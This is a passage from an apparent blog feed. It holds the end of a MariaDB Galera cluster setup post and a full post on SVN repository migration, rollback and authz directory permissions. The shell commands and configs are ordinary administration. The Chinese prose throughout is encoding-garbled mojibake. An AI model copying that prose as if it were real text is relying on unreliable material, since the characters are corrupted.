###è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œå¦‚æœé›†ç¾¤æ˜¯ç¬¬ä¸€æ¬¡å¯åŠ¨è¯·ç”¨å½“å‰é…ç½®ï¼Œç­‰å…¶ä»–èŠ‚ç‚¹å¯åŠ¨èµ·æ¥åå°†ä¸‹é¢ä¸¤è¡Œçš„æ³¨é‡Šå¯¹æ¢é‡å¯æœ¬èŠ‚ç‚¹å°±OK
wsrep_cluster_address=&quot;gcomm://&quot;
#wsrep_cluster_address=&quot;gcomm://10.45.207.236,10.174.246.101,10.251.174.207&quot;
wsrep_cluster_name=&apos;cluster1&apos;
wsrep_node_address=&apos;10.45.207.236&apos;
wsrep_node_name=&apos;node1&apos;
wsrep_sst_method=rsync
wsrep_sst_auth=cluster:lookback
</code></pre><p>æ³¨æ„<code>wsrep_provider=/usr/lib64/galera/libgalera_smm.so</code> so æ–‡ä»¶çš„çœŸå®ä½ç½®</p>
<p>node2</p>
<pre><code>[root@node2 ~]# sed -ne &apos;/\[mariadb-10.0\]/,//p&apos; /etc/my.cnf.d/server.cnf
[mariadb-10.0]

query_cache_size=0
binlog_format=ROW
default_storage_engine=innodb
innodb_autoinc_lock_mode=2
wsrep_provider=/usr/lib64/galera/libgalera_smm.so
wsrep_cluster_address=&quot;gcomm://10.45.207.236,10.174.246.101,10.251.174.207&quot;
wsrep_cluster_name=&apos;cluster1&apos;
wsrep_node_address=&apos;10.174.246.101&apos;
wsrep_node_name=&apos;node2&apos;
wsrep_sst_method=rsync
wsrep_sst_auth=cluster:lookback
</code></pre><p>node3</p>
<pre><code>[root@node3 ~]# sed -ne &apos;/\[mariadb-10.0\]/,//p&apos; /etc/my.cnf.d/server.cnf
[mariadb-10.0]

query_cache_size=0
binlog_format=ROW
default_storage_engine=innodb
innodb_autoinc_lock_mode=2
wsrep_provider=/usr/lib64/galera/libgalera_smm.so
wsrep_cluster_address=&quot;gcomm://10.45.207.236,10.174.246.101,10.251.174.207&quot;
wsrep_cluster_name=&apos;cluster1&apos;
wsrep_node_address=&apos;10.251.174.207&apos;
wsrep_node_name=&apos;node3&apos;
wsrep_sst_method=rsync
wsrep_sst_auth=cluster:lookback
</code></pre><p>ä¸€äº›å…±åŒçš„å‚æ•°é…ç½®:</p>
<p>[mysqld]ä¸‹éƒ½åŠ ä¸Š skip-name-resolve</p>
<h3 id="u8BBE_u7F6Eswap"><a href="#u8BBE_u7F6Eswap" class="headerlink" title="è®¾ç½®swap"></a>è®¾ç½®swap</h3><pre><code>[root@node2 ~]# fallocate -l 512M /swapfile
[root@node2 ~]# chmod 600 /swapfile
[root@node2 ~]# mkswap /swapfile
[root@node2 ~]# swapon /swapfile
[root@node2 ~]# mount -a
[root@node2 ~]# cat /etc/fstab |grep swap
# swapfile
/swapfile none swap defaults 0 0
[root@node2 ~]# swapon --summary
Filename                                Type            Size    Used    Priority
/swapfile                               file            524280  0       -1
</code></pre><h2 id="u542F_u52A8"><a href="#u542F_u52A8" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h2><p>å…ˆå¯åŠ¨ node1çš„mariadb, ç„¶åå¯åŠ¨ node2, node3<br>ç„¶åä¿®æ”¹ node1é…ç½®æ–‡ä»¶, å¯¹æ¢ gcomm é‚£é‡Œçš„é…ç½®, é‡å¯ node1çš„mariadb<br>è¿›å…¥å„ä¸ª node çš„æ•°æ®åº“, æŸ¥çœ‹</p>
<pre><code>MariaDB [(none)]&gt; SHOW STATUS LIKE &apos;wsrep%&apos;;

 +---------------------------+------------+
 | Variable_name             | Value      |
 +---------------------------+------------+
 ...
 | wsrep_local_state_comment | Synced (6) |
 | wsrep_cluster_size        | 3          |
 | wsrep_ready               | ON         |
 +---------------------------+------------+
</code></pre><h2 id="u6D4B_u8BD5"><a href="#u6D4B_u8BD5" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>1.èŠ‚ç‚¹å†™å…¥æµ‹è¯•,åˆ†åˆ«åœ¨3å° node ä¸Šè¿›è¡Œå†™å…¥æµ‹è¯•</p>
<pre><code>CREATE DATABASE galeratest;
USE galeratest;
CREATE TABLE test_table (
        id INT PRIMARY KEY AUTO_INCREMENT,
        msg TEXT ) ENGINE=InnoDB;
INSERT INTO test_table (msg)
        VALUES (&quot;Hello my dear cluster.&quot;);
INSERT INTO test_table (msg)
        VALUES (&quot;Hello, again, cluster dear.&quot;);
</code></pre><p>2.è„‘è£‚æµ‹è¯•</p>
<p>æ‰©å±•é˜…è¯»:</p>
<p><a href="http://my.oschina.net/moooofly/blog/92288" target="_blank" rel="external">HA é›†ç¾¤çš„è„‘è£‚é—®é¢˜</a></p>
<p>å‚è€ƒ:</p>
<p><a href="http://www.dwhd.org/20150924_133631.html" target="_blank" rel="external">Linuxä¹‹CentOS 6.7ä¸Šç¼–è¯‘+YUMä¸¤ç§æ–¹æ³•é…ç½®MariaDB Galeraå¤šä¸»é›†ç¾¤å®ç°HA</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://galeracluster.com/documentation-webpages/">å®˜ç½‘æ–‡æ¡£</a></p>
<h2 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><h3 id="u6709_u4E09_u79CD_u7248_u672C_u53EF_u4EE5_u9009_u62E9_u5B89_u88C5"><a href="#u6709_u4E09_u79CD_u7248_u672C_u53EF_u4EE5_u9009_u62E9_u5B89_u88C5" class="headerlink" title="æœ‰ä¸‰ç§ç‰ˆæœ¬å¯ä»¥é€‰æ‹©å®‰è£…"></a>æœ‰ä¸‰ç§ç‰ˆæœ¬å¯ä»¥é€‰æ‹©å®‰è£…</h3><ul>
<li>mysql ç‰ˆæœ¬</li>
<li>Percona XtraDB Cluster ç‰ˆæœ¬</li>
<li>Mariadb ç‰ˆæœ¬</li>
</ul>
<h3 id="u5B89_u88C5_u9047_u5230_u5F88_u591A_u5751_3A"><a href="#u5B89_u88C5_u9047_u5230_u5F88_u591A_u5751_3A" class="headerlink" title="å®‰è£…é‡åˆ°å¾ˆå¤šå‘:"></a>å®‰è£…é‡åˆ°å¾ˆå¤šå‘:</h3><p>æ¯”å¦‚, å®‰è£… mysql ç‰ˆæœ¬çš„, æ›´æ–° yum æºæ—¶å€™, è¢«å¢™äº†:</p>
<pre><code>http://releases.galeracluster.com/centos/6/x86_64/repodata/repomd.xml: [Errno 14] PYCURL ERROR 6 - &quot;Couldn&apos;t resolve host &apos;releases.galeracluster.com&apos;&quot;
Trying other mirror.
Error: Cannot retrieve repository metadata (repomd.xml) for repository: galera. Please verify its path and try again
</code></pre><p>æ¯”å¦‚, å®‰è£… Percona XtraDB Cluster ç‰ˆæœ¬çš„, æç¤ºä»“åº“æ²¡é‚£ä¸ªè½¯ä»¶åŒ…â€¦</p>
<pre><code>[root@node2 ~]#  yum install Percona-XtraDB-Cluster -y
Loaded plugins: security
Setting up Install Process
No package Percona-XtraDB-Cluster available.
Error: Nothing to do
</code></pre><p>æ¯”å¦‚, è£…äº† PXC çš„ yum ä»“åº“åŒ…ä¹‹å, å†è£… mariadb, ä¼šäº§ç”Ÿè½¯ä»¶åŒ…å†²çª, md å¾—æ ¼å¼åŒ–ç³»ç»Ÿäº† - -</p>
<pre><code>Transaction Check Error:
  file /usr/lib64/libmysqlclient.so.16.0.0 from install of MariaDB-compat-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
  file /usr/lib64/libmysqlclient_r.so.16.0.0 from install of MariaDB-compat-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
  file /etc/my.cnf from install of MariaDB-common-10.0.24-1.el6.x86_64 conflicts with file from package Percona-Server-shared-51-5.1.73-rel14.12.625.rhel6.x86_64
</code></pre>]]>
    
    </summary>
    
      <category term="Galera" scheme="http://yoursite.com/tags/Galera/"/>
    
      <category term="MySQL" scheme="http://yoursite.com/tags/MySQL/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svnä»“åº“é—´æ•°æ®è½¬ç§», å›æ»š, å­ç›®å½•æƒé™æ§åˆ¶]]></title>
    <link href="http://yoursite.com/2016/04/12/svn%E4%BB%93%E5%BA%93%E9%97%B4%E6%95%B0%E6%8D%AE%E8%BD%AC%E7%A7%BB/"/>
    <id>http://yoursite.com/2016/04/12/svnä»“åº“é—´æ•°æ®è½¬ç§»/</id>
    <published>2016-04-12T01:36:17.000Z</published>
    <updated>2016-05-10T10:16:04.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u8D77_u56E0"><a href="#u8D77_u56E0" class="headerlink" title="èµ·å› "></a>èµ·å› </h3><p>ç”±äºä¹‹å‰çš„åŒäº‹æ²¡æœ‰å¥½å¥½è§„åˆ’ svn ä»“åº“ç»“æ„, ç°éœ€è¦é‡æ–°è§„åˆ’ç›®å½•ç»“æ„å¦‚ä¸‹:</p>
<pre><code>project1
    â”œâ”€â”€ branches
    â”œâ”€â”€ tags
    â””â”€â”€ trunk
        â”œâ”€â”€ code
        â”‚   â”œâ”€â”€ andriod
        â”‚   â”œâ”€â”€ ios
        â”‚   â”œâ”€â”€ php
        â”‚   â””â”€â”€ sql
        â”œâ”€â”€ doc
        â””â”€â”€ readme.txt
</code></pre><p><strong>trunk</strong>æ˜¯ä¸»åˆ†æ”¯ï¼Œæ˜¯æ—¥å¸¸å¼€å‘è¿›è¡Œçš„åœ°æ–¹ã€‚</p>
<p><strong>branches</strong>æ˜¯åˆ†æ”¯ã€‚ä¸€äº›é˜¶æ®µæ€§çš„releaseç‰ˆæœ¬ï¼Œè¿™äº›ç‰ˆæœ¬æ˜¯å¯ä»¥ç»§ç»­è¿›è¡Œå¼€å‘å’Œç»´æŠ¤çš„ï¼Œåˆ™æ”¾åœ¨branchesç›®å½•ä¸­ã€‚åˆæ¯”å¦‚ä¸ºä¸åŒç”¨æˆ·å®¢åˆ¶åŒ–çš„ç‰ˆæœ¬ï¼Œä¹Ÿå¯ä»¥æ”¾åœ¨åˆ†æ”¯ä¸­è¿›è¡Œå¼€å‘ã€‚</p>
<p><strong>tags</strong>ç›®å½•ä¸€èˆ¬æ˜¯åªè¯»çš„ï¼Œè¿™é‡Œå­˜å‚¨é˜¶æ®µæ€§çš„å‘å¸ƒç‰ˆæœ¬ï¼Œåªæ˜¯ä½œä¸ºä¸€ä¸ªé‡Œç¨‹ç¢‘çš„ç‰ˆæœ¬è¿›è¡Œå­˜æ¡£ã€‚    </p>
<p>ç°åœ¨éœ€è¦å°†åˆ†æ•£çš„ä»£ç ä»“åº“éƒ½è¿ç§»æ”¾åˆ° <em>trunk-code</em> ç›®å½•ä¸‹è¿›è¡Œåˆ†ç±»å­˜æ”¾, å¹¶è§„åˆ’ç›¸åº”ä»“åº“çš„äººå‘˜æƒé™</p>
<a id="more"></a>
<h3 id="u6743_u9650_u6D4B_u8BD5"><a href="#u6743_u9650_u6D4B_u8BD5" class="headerlink" title="æƒé™æµ‹è¯•"></a>æƒé™æµ‹è¯•</h3><p>ç”±äºè¿ç§»å¾—å…ˆé€šçŸ¥éƒ¨é—¨æˆå‘˜, åœæ­¢æäº¤å¹¶æš‚åœ svn æœåŠ¡, ä¼°è®¡å¾—æ‰¾ä¸ªå¤œé»‘é£é«˜çš„æ—¶å€™è¿›è¡Œ, å¤§ç™½å¤©çš„æˆ‘è¿˜æ˜¯å…ˆæµ‹è¯•ä¸€ä¸‹å­ç›®å½•é‡Œä»“åº“çš„äººå‘˜æƒé™å§</p>
<p>è™½è¯´æ˜¯æƒé™æµ‹è¯•, æˆ‘ä»¬ä¹Ÿå¾—æç‚¹æ•°æ®è¿‡æ¥, é¡ºä¾¿å½“ä»£ç ä»“åº“è¿ç§»æ¼”ç»ƒå§</p>
<h4 id="u4ED3_u5E93_u95F4_u6570_u636E_u8FC1_u79FB_u65B9_u5F0F_3A"><a href="#u4ED3_u5E93_u95F4_u6570_u636E_u8FC1_u79FB_u65B9_u5F0F_3A" class="headerlink" title="ä»“åº“é—´æ•°æ®è¿ç§»æ–¹å¼:"></a>ä»“åº“é—´æ•°æ®è¿ç§»æ–¹å¼:</h4><p>ä¸èƒ½ç›´æ¥å°†Aä»“åº“é‡å‘½åä¸ºBï¼Œæˆ–å°†Aå¤åˆ¶å¾—åˆ°ä¸€ä¸ªå¤æœ¬ï¼Œå†å°†å¤æœ¬å‘½åä¸ºB</p>
<p>ä½¿ç”¨<em>svnadmin dump</em> &amp; <em>svnadmin load</em></p>
<p>åˆ›å»ºBä»“åº“(å¦‚æœBä¸å­˜åœ¨)</p>
<pre><code>svnadmin create /svndata/B    
</code></pre><p>å¯¼å‡ºAä»“åº“</p>
<pre><code>svnadmin dump /svndata/A &gt; A.dump    
</code></pre><p>å°† Aä»“åº“ å¤‡ä»½æ–‡ä»¶å¯¼å…¥ B ä»“åº“</p>
<pre><code>svnadmin load /svndata/B &lt; A.dump
</code></pre><h4 id="u7136_u800C_u95EE_u9898_u6765_u4E86"><a href="#u7136_u800C_u95EE_u9898_u6765_u4E86" class="headerlink" title="ç„¶è€Œé—®é¢˜æ¥äº†"></a>ç„¶è€Œé—®é¢˜æ¥äº†</h4><p>å‘ç°è®¾æƒ³çš„svnç›®å½•ç»“æ„ä¸å¤ªå¥½å®ç°, å› ä¸ºsvn ä¸æ”¯æŒä»“åº“é‡Œé¢åˆ›å»ºå­ä»“åº“, åªèƒ½è‡ªå·±åˆ›å»ºå­ç›®å½•</p>
<pre><code># svnadmin create project1/trunk
svnadmin: E165002: &apos;/data/svndata/project1/trunk&apos; is a subdirectory of an existing repository rooted at &apos;/data/svndata/project1&apos;
</code></pre><p>å¦‚æœæ˜¯é€šè¿‡å­ç›®å½•çš„æ–¹å¼, å‡è®¾ios ç›®å½•çš„ä»£ç è¦å›æ»š, é‚£å²‚ä¸æ˜¯æ•´ä¸ªä»£ç ä»“åº“éƒ½è¦è·Ÿç€å›æ»šäº†?</p>
<p>ä¸è¿‡ä¹Ÿä¸ç¡®å®šèƒ½ä¸èƒ½åªå›æ»šå•ä¸ªç›®å½•, è¿˜å¾—å®éªŒæµ‹è¯•ä¸€ä¸‹</p>
<p>è€Œä¸”é€šè¿‡ checkout æ—§ä»“åº“åˆ°å­ç›®å½•, ç„¶åå† add/commit åˆ°æ–°ä»“åº“çš„æ–¹å¼, æ—§ä»“åº“çš„å†å²è®°å½•ä¸å°±éƒ½ä¸¢å¤±äº†ä¹ˆ? å› ä¸ºä¸åˆ é™¤ .svn å°±æ— æ³• add, ä¼šæŠ¥é”™çš„</p>
<pre><code>svn: warning: W150002: &apos;/opt/www/svnhook/project1/trunk/code/php/everouter_app&apos; is already under version control
svn: E200009: Could not add all targets because some targets are already versioned
svn: E200009: Illegal target for the requested operation
</code></pre><p>å¦‚æœèƒ½æ¥å—ä¸¢å¤±æ—§åº“å†å²ç‰ˆæœ¬, é‚£ä¹ˆæµ‹è¯•ä¸€ä¸‹èƒ½ä¸èƒ½åªå›æ»šå•ä¸ªç›®å½•(ç»ä¸‹æ–¹æ£€æµ‹, æ˜¯å¯ä»¥çš„)</p>
<h4 id="u597D_u5427_2C__u987A_u4FBF_u6765_u5B66_u4E60_u4E00_u4E0B_svn__u7684_u56DE_u6EDA"><a href="#u597D_u5427_2C__u987A_u4FBF_u6765_u5B66_u4E60_u4E00_u4E0B_svn__u7684_u56DE_u6EDA" class="headerlink" title="å¥½å§, é¡ºä¾¿æ¥å­¦ä¹ ä¸€ä¸‹ svn çš„å›æ»š"></a>å¥½å§, é¡ºä¾¿æ¥å­¦ä¹ ä¸€ä¸‹ svn çš„å›æ»š</h4><p>å…ˆåˆ†åˆ«åˆ°2ä¸ªå­ç›®å½•åšå˜æ›´æäº¤</p>
<pre><code>[root@iZ94c5cs7guZ everouter_app]# touch outest
[root@iZ94c5cs7guZ everouter_app]# svn add outest
A         outest
[root@iZ94c5cs7guZ everouter_app]# svn ci -m &quot;add outest&quot;

[root@iZ94c5cs7guZ everinner_app]# touch intest
[root@iZ94c5cs7guZ everinner_app]# svn add intest
A         intest
[root@iZ94c5cs7guZ everinner_app]# svn ci -m &quot;add intest&quot;    
</code></pre><p>è¿˜æœ‰2ä¸ªæœªæäº¤çš„    </p>
<pre><code>[root@iZ94c5cs7guZ everinner_app]# echo 123 &gt; intest
[root@iZ94c5cs7guZ everinner_app]# svn st
M       intest
[root@iZ94c5cs7guZ everinner_app]# cd ..
[root@iZ94c5cs7guZ php]# cd everouter_app/
[root@iZ94c5cs7guZ everouter_app]# echo 456 &gt; outest
[root@iZ94c5cs7guZ everouter_app]# svn st
M       outest
[root@iZ94c5cs7guZ everouter_app]# cd ..
[root@iZ94c5cs7guZ php]# svn st
M       everinner_app/intest
M       everouter_app/outest
</code></pre><p>ç°åœ¨æœ‰2ä¸ªå°šæœªæäº¤çš„æ”¹åŠ¨, è¯•è¯•çœ‹èƒ½ä¸èƒ½åª revert å…¶ä¸­ä¸€ä¸ª</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn revert everinner_app/intest
Reverted &apos;everinner_app/intest&apos;
[root@iZ94c5cs7guZ php]# svn st
M       everouter_app/outest
</code></pre><p>å¥½, å¯ä»¥ç‡åˆ°, å•ç‹¬ revert ä¸€ä¸ªæœª commit çš„æ–‡ä»¶ç³»æŸé—®é¢˜å˜…</p>
<p>ç„¶åæµ‹è¯•å¯¹æ•´ä¸ªç›®å½•çš„å›æ»š, å…ˆè¿›è¡Œä¸€äº›å˜æ›´</p>
<pre><code>[root@iZ94c5cs7guZ php]# cd everinner_app/
[root@iZ94c5cs7guZ everinner_app]# echo 789 &gt; intest
[root@iZ94c5cs7guZ everinner_app]# cd conf/
[root@iZ94c5cs7guZ conf]# echo 456 &gt; intest2
[root@iZ94c5cs7guZ conf]# svn add intest2
A         intest2
[root@iZ94c5cs7guZ conf]# cd ..
[root@iZ94c5cs7guZ everinner_app]# svn st
M       conf/intest2
M       intest
</code></pre><p>çœ‹çœ‹å‘ç”Ÿçš„å˜æ›´</p>
<pre><code>[root@iZ94c5cs7guZ everinner_app]# cd ..
[root@iZ94c5cs7guZ php]# svn st
A       everinner_app/conf/intest2
M       everinner_app/intest
M       everouter_app/outest
</code></pre><p>å›æ»ševerinner_appç›®å½•</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn revert everinner_app/ --recursive
Reverted &apos;everinner_app/conf/intest2&apos;
Reverted &apos;everinner_app/intest&apos;
[root@iZ94c5cs7guZ php]# svn st
M       everouter_app/outest
</code></pre><p>å¯ä»¥çœ‹å‡º, æœª commit çš„ç›®å½•ä¹Ÿæ˜¯å¯ä»¥æ•´ä¸ªå›æ»šçš„, ä½†æ˜¯å…·ä½“åˆ°å¼€å‘äººå‘˜ä½¿ç”¨ä¼šæ˜¯æ€æ ·çš„ä¸€ç§æƒ…å†µå‘¢â€¦</p>
<p>é‚£ä¹ˆå·²ç» commit çš„æƒ…å†µä¸‹å‘¢?</p>
<p>æŸ¥çœ‹ä¸€ä¸‹æäº¤çš„å†å²è®°å½•</p>
<pre><code>$ svn update

$ svn log|less

------------------------------------------------------------------------
r5 | hugo | 2016-04-12 16:02:32 +0800 (Tue, 12 Apr 2016) | 1 line

666 outest
------------------------------------------------------------------------
r4 | hugo | 2016-04-12 15:59:55 +0800 (Tue, 12 Apr 2016) | 1 line

add outest change
------------------------------------------------------------------------
r3 | hugo | 2016-04-12 14:20:01 +0800 (Tue, 12 Apr 2016) | 1 line

add outest
------------------------------------------------------------------------
r2 | hugo | 2016-04-12 14:19:25 +0800 (Tue, 12 Apr 2016) | 1 line

add intest
------------------------------------------------------------------------
r1 | hugo | 2016-04-12 11:56:01 +0800 (Tue, 12 Apr 2016) | 1 line

add trunk/code/php/everinner_app and trunk/code/php/everouter_app
------------------------------------------------------------------------
(END)
</code></pre><p>å‡è®¾æˆ‘ä»¬outest æ–‡ä»¶ä¿®æ”¹é”™äº†, è¦å›æ»šåˆ°r3ç‰ˆæœ¬(å½“å‰ç‰ˆæœ¬æ˜¯ r5, ), å…ˆå¯¹æ¯”ä¸€ä¸‹</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn diff -r 5:3 everouter_app/outest
Index: everouter_app/outest
===================================================================
--- everouter_app/outest    (revision 5)
+++ everouter_app/outest    (revision 3)
@@ -1,2 +0,0 @@
-456
-666
</code></pre><p>å¯ä»¥çœ‹å‡º r3ç‰ˆæœ¬æ˜¯æ²¡æœ‰456,666è¿™ä¸¤è¡Œçš„,ç¡®å®šæ— è¯¯ä¹‹å, ç”¨ merge å›æ»š</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn merge -r 5:3 everouter_app/outest
--- Reverse-merging r5 through r4 into &apos;everouter_app/outest&apos;:
U    everouter_app/outest
--- Recording mergeinfo for reverse merge of r5 through r4 into &apos;everouter_app/outest&apos;:
 U   everouter_app/outest
--- Eliding mergeinfo from &apos;everouter_app/outest&apos;:
 U   everouter_app/outest
[root@iZ94c5cs7guZ php]# cat everouter_app/outest
[root@iZ94c5cs7guZ php]#
</code></pre><p>ç¡®è®¤æ— è¯¯å, æäº¤</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn commit -m &quot;revert to revision 3&quot;
Sending        everouter_app/outest
Transmitting file data .
Committed revision 6.
</code></pre><p>å¦‚æœ outer ç›®å½•å’Œ inner ç›®å½•éƒ½æœ‰å˜æ›´, å›æ»šä¼šä¸ä¼šäº’ç›¸å½±å“å‘¢, ç”¨è„šè¶¾å¤´æƒ³æƒ³æ˜¯ä¼šçš„</p>
<pre><code>[root@iZ94c5cs7guZ php]# svn diff -r 7:4
Index: everinner_app/intest
===================================================================
--- everinner_app/intest    (revision 7)
+++ everinner_app/intest    (revision 4)
@@ -1 +0,0 @@
-123
Index: everouter_app/outest
===================================================================
--- everouter_app/outest    (revision 7)
+++ everouter_app/outest    (revision 4)
@@ -0,0 +1 @@
+456  
</code></pre><p>çœ‹ä¸Šé¢çš„å¯¹æ¯”, å¦‚æœæˆ‘ä»¬æƒ³è¦å›åˆ°ç‰ˆæœ¬4,è®© intest å»æ‰123é‚£è¡Œ, é‚£ä¹ˆä¼šä½¿å¾— outest å¢åŠ 456, ç›¸äº’å½±å“äº†</p>
<p>å¥½å§, å­ç›®å½•çš„å›æ»šä¹‹è°œå·²ç»è§£å†³, ç»“è®ºå°±æ˜¯æœª commit çš„å¯ä»¥ç›®å½•å†… revert, å­ç›®å½•é—´ä¸å—å½±å“</p>
<p>å·²ç» commit çš„åˆ™ä¸èƒ½éšæ„ merge äº†, ä¼šå½±å“åˆ°å…¶ä»–ç›®å½•å†…å®¹</p>
<h4 id="u6B63_u5F0F_u5F00_u59CB_u6743_u9650_u6D4B_u8BD5"><a href="#u6B63_u5F0F_u5F00_u59CB_u6743_u9650_u6D4B_u8BD5" class="headerlink" title="æ­£å¼å¼€å§‹æƒé™æµ‹è¯•"></a>æ­£å¼å¼€å§‹æƒé™æµ‹è¯•</h4><p>æäº†è¿™ä¹ˆå¤š,ç›®å½•ç»“æ„ä¹Ÿæ¯”è¾ƒå¤æ‚äº†, å¯ä»¥å¼€å§‹å­ç›®å½•çš„æƒé™æ§åˆ¶æµ‹è¯•äº†</p>
<p>ç°åœ¨è¿›è¡Œç”¨æˆ·è§„åˆ’ç®¡ç†</p>
<p>admin æ‹¥æœ‰project1æ‰€æœ‰çš„æ§åˆ¶æƒé™</p>
<p>cto æ‹¥æœ‰codeç›®å½•ä»¥åŠå­ç›®å½•çš„æƒé™</p>
<p>in_user æ‹¥æœ‰inner ç›®å½•çš„æƒé™</p>
<p>ou_user æ‹¥æœ‰outer ç›®å½•çš„æƒé™</p>
<p>authzæ–‡ä»¶(æ‰å‘ç°ç›´æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶, ä¸ç”¨é‡å¯ svn å°±èƒ½ç”Ÿæ•ˆ)</p>
<pre><code>[groups]
cto = ctouser
in_user = hxk
ou_user = cn

[svndata:/project1]
@cto = r

[svndata:/project1/trunk/code]
@cto = rw
</code></pre><p>checkout è¯•è¯•</p>
<pre><code>$ svn co   svn://test.svn.cn/project1/trunk/code  --username ctouser
A    code/php
A    code/php/everinner_app
A    code/php/everinner_app/conf
A    code/php/everinner_app/conf/config.php    
...    
</code></pre><p>ç–—æ•ˆä¸é”™,ç»“æœå‘ç°æ²¡æœ‰å†™æƒé™â•®(â•¯_â•°)â•­</p>
<p>ç»“æœéƒ½æ˜¯æ³ªå•Š:</p>
<p><em>ç”¨æˆ·åœ¨çˆ¶ç›®å½•çš„æƒé™ä¼šæŠŠå­ç›®å½•çš„ç»™è¦†ç›–â€‹, æ— æ³•è¿›è¡Œæœ‰æ•ˆçš„ç”¨æˆ·æƒé™æ§åˆ¶.</em></p>
<p>ä½ å¯èƒ½ä¼šè¯´, ç›´æ¥åœ¨å­ç›®å½•ç»™æƒé™ä¸å°±è¡Œäº†, æŠ±æ­‰, è¿™æ ·è¿æ ¹ç›®å½•çš„è¯»æƒé™éƒ½æ²¡æœ‰, æ˜¯ä¸èƒ½é€šè¿‡éªŒè¯çš„</p>
<h3 id="u65E5_u4E86_uD83D_uDC36_2C__u53D1_u73B0_u4EE5_u524D_u88AB_u67D0_u7BC7_u6587_u7AE0_u8BEF_u5BFC_u4E86_2C__u539F_u6765_u662F_u80FD_u505A_u5B50_u76EE_u5F55_u6743_u9650_u63A7_u5236_u7684_21"><a href="#u65E5_u4E86_uD83D_uDC36_2C__u53D1_u73B0_u4EE5_u524D_u88AB_u67D0_u7BC7_u6587_u7AE0_u8BEF_u5BFC_u4E86_2C__u539F_u6765_u662F_u80FD_u505A_u5B50_u76EE_u5F55_u6743_u9650_u63A7_u5236_u7684_21" class="headerlink" title="æ—¥äº†ğŸ¶, å‘ç°ä»¥å‰è¢«æŸç¯‡æ–‡ç« è¯¯å¯¼äº†, åŸæ¥æ˜¯èƒ½åšå­ç›®å½•æƒé™æ§åˆ¶çš„!"></a>æ—¥äº†ğŸ¶, å‘ç°ä»¥å‰è¢«æŸç¯‡æ–‡ç« è¯¯å¯¼äº†, åŸæ¥æ˜¯èƒ½åšå­ç›®å½•æƒé™æ§åˆ¶çš„!</h3><p>æ­£ç¡®çš„å†™æ³•æ˜¯è¿™æ ·:</p>
<pre><code>[/]
@admin = r
@dev = r
@hook = r

[/branches]
@dev = rw

[/trunk]
kali = rw
lilia = rw

[/tags]
admin = rw
</code></pre><p>çœŸæ˜¯è¢«æŸäº›æ–‡ç« è¯¯å¯¼äº†!ä»¥åè¿˜æ˜¯ç›´æ¥çœ‹å®˜ç½‘æ–‡æ¡£å§ - -</p>
<p>æ‰©å±•é˜…è¯»:</p>
<p><a href="http://developer.51cto.com/art/201005/201718.htm" target="_blank" rel="external">SVNä¸­tag branch trunkç”¨æ³•è¯¦è§£</a>    </p>
<p>å‚è€ƒ:</p>
<p><a href="http://blog.csdn.net/pttaag/article/details/8076210" target="_blank" rel="external">SVNçš„æ ‡å‡†ç›®å½•ç»“æ„ï¼štrunkã€branchesã€tags</a></p>
<p><a href="http://huguiqi.com/2016/03/07/linux%E4%B8%8BSVN%E4%BB%93%E5%BA%93%E9%97%B4%E6%95%B0%E6%8D%AE%E8%BD%AC%E7%A7%BB%E6%88%96%E9%87%8D%E5%91%BD%E5%90%8D/" target="_blank" rel="external">linuxä¸‹SVNä»“åº“é—´æ•°æ®è½¬ç§»æˆ–é‡å‘½å</a></p>
<p><a href="http://holbrook.github.io/2014/01/29/svn_install_config_and_mgnt.html" target="_blank" rel="external">subversionå®‰è£…ã€é…ç½®å’Œç®¡ç†</a></p>
<p><a href="http://hushicai.com/2014/03/06/ming-ling-xing-zhong-hui-gun-svn.html" target="_blank" rel="external">å‘½ä»¤è¡Œä¸­å›æ»šsvn</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u8D77_u56E0"><a href="#u8D77_u56E0" class="headerlink" title="èµ·å› "></a>èµ·å› </h3><p>ç”±äºä¹‹å‰çš„åŒäº‹æ²¡æœ‰å¥½å¥½è§„åˆ’ svn ä»“åº“ç»“æ„, ç°éœ€è¦é‡æ–°è§„åˆ’ç›®å½•ç»“æ„å¦‚ä¸‹:</p>
<pre><code>project1
    â”œâ”€â”€ branches
    â”œâ”€â”€ tags
    â””â”€â”€ trunk
        â”œâ”€â”€ code
        â”‚   â”œâ”€â”€ andriod
        â”‚   â”œâ”€â”€ ios
        â”‚   â”œâ”€â”€ php
        â”‚   â””â”€â”€ sql
        â”œâ”€â”€ doc
        â””â”€â”€ readme.txt
</code></pre><p><strong>trunk</strong>æ˜¯ä¸»åˆ†æ”¯ï¼Œæ˜¯æ—¥å¸¸å¼€å‘è¿›è¡Œçš„åœ°æ–¹ã€‚</p>
<p><strong>branches</strong>æ˜¯åˆ†æ”¯ã€‚ä¸€äº›é˜¶æ®µæ€§çš„releaseç‰ˆæœ¬ï¼Œè¿™äº›ç‰ˆæœ¬æ˜¯å¯ä»¥ç»§ç»­è¿›è¡Œå¼€å‘å’Œç»´æŠ¤çš„ï¼Œåˆ™æ”¾åœ¨branchesç›®å½•ä¸­ã€‚åˆæ¯”å¦‚ä¸ºä¸åŒç”¨æˆ·å®¢åˆ¶åŒ–çš„ç‰ˆæœ¬ï¼Œä¹Ÿå¯ä»¥æ”¾åœ¨åˆ†æ”¯ä¸­è¿›è¡Œå¼€å‘ã€‚</p>
